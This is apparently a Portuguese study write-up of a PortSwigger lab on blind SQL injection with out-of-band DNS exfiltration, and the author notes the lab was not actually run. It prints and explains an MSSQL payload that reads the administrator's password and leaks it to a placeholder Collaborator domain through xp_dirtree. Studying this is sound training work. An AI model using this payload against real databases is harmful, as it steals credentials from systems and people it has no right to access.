# Lab 14: Blind SQL injection with out-of-band data exfiltration

> ⚠️ **AVISO — ESTUDO TEÓRICO, LAB NÃO EXECUTADO**
>
> Este laboratório **não foi realizado na prática**.
>
> O laboratório exige o uso do **Burp Collaborator**, recurso do Burp Suite Professional, que não está disponível na versão utilizada.
>
> Portanto, esta documentação registra o **estudo teórico** do laboratório. Os payloads não foram executados nem validados na prática.

**Vulnerabilidade:** Blind SQL Injection (via cookie, Out-of-Band / OAST - DNS, data exfiltration)

**Objetivo:**
Explorar a Blind SQL Injection para extrair a senha do usuário `administrator` através de uma interação DNS e posteriormente utilizar a senha para realizar login.

### Estrutura conhecida do banco

O laboratório informa a existência da tabela:

```text
users
├── username
└── password
```

O objetivo é obter:

```sql
SELECT password
FROM users
WHERE username='administrator'
```

### Problema

A query é executada de forma assíncrona e seu resultado não aparece na resposta HTTP.

Portanto, mesmo que a query retorne:

```text
S3cure
```

não conseguimos simplesmente visualizar esse valor na página.

É necessário utilizar o canal OAST para transportar a informação para fora da aplicação.

### Exfiltração através de DNS

A ideia é:

```text
SELECT password
       ↓
     S3cure
       ↓
S3cure.DOMINIO-COLLABORATOR
       ↓
DNS lookup
       ↓
Burp Collaborator
       ↓
Senha observada
```

Dessa maneira, o dado extraído do banco é incorporado ao domínio utilizado na interação DNS.

### Payload apresentado pelo PortSwigger

Exemplo para Microsoft SQL Server:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.DOMINIO-COLLABORATOR/a"')--
```

### Análise do payload

#### 1. Fechamento do contexto original

```sql
';
```

Fecha a string SQL original e permite continuar a injeção.

#### 2. Criação da variável

```sql
declare @p varchar(1024);
```

Cria a variável `@p`, utilizada para armazenar o resultado da consulta.

#### 3. Extração da senha

```sql
set @p=(
    SELECT password
    FROM users
    WHERE username='Administrator'
);
```

A consulta busca a senha do usuário `Administrator`.

Se o resultado fosse:

```text
S3cure
```

então:

```text
@p = 'S3cure'
```

#### 4. Construção do domínio

O valor de `@p` é concatenado com o domínio do Collaborator:

```text
S3cure.DOMINIO-COLLABORATOR
```

Assim, a informação extraída do banco passa a fazer parte do hostname.

#### 5. Provocação do DNS

```sql
master..xp_dirtree
```

O SQL Server utiliza essa funcionalidade para tentar acessar/resolver o caminho de rede, provocando a interação DNS.

#### 6. Comentário do restante da query

```sql
--
```

Comenta o restante da query original para evitar que ela interfira na injeção.

### Diferença entre detecção e exfiltração

**Detecção:**

```text
teste.DOMINIO-COLLABORATOR
```

Serve para responder:

> "O servidor realizou uma interação externa?"

**Exfiltração:**

```text
S3cure.DOMINIO-COLLABORATOR
```

Serve para responder:

> "Qual informação foi incorporada à interação externa?"

### Fluxo completo

```text
TrackingId
    ↓
SQL Injection
    ↓
SELECT password
    ↓
@p = senha
    ↓
senha + domínio Collaborator
    ↓
xp_dirtree
    ↓
DNS lookup
    ↓
Collaborator
    ↓
senha recuperada
    ↓
login como administrator
    ↓
LAB SOLVED
```

### Conceitos aprendidos

- OAST pode ser utilizado além da simples detecção de vulnerabilidades.
- Dados podem ser exfiltrados através de uma interação out-of-band.
- O DNS pode transportar pequenas quantidades de informação através do hostname consultado.
- A técnica de exfiltração depende do DBMS.
- Em Microsoft SQL Server, `xp_dirtree` pode ser utilizado para provocar uma interação DNS.
- O resultado de uma query pode ser armazenado em uma variável e incorporado ao domínio utilizado na interação.
- OAST pode ser mais eficiente que algumas técnicas de Blind SQLi baseadas em inferência, pois permite obter dados diretamente em vez de reconstruí-los caractere por caractere.
- Técnicas OAST são úteis especialmente quando a aplicação não fornece nenhum feedback através da resposta HTTP.

**Status:** ⚠️ Teoria estudada — laboratório não executado.

**Motivo:** Necessidade do Burp Collaborator, disponível no Burp Suite Professional.
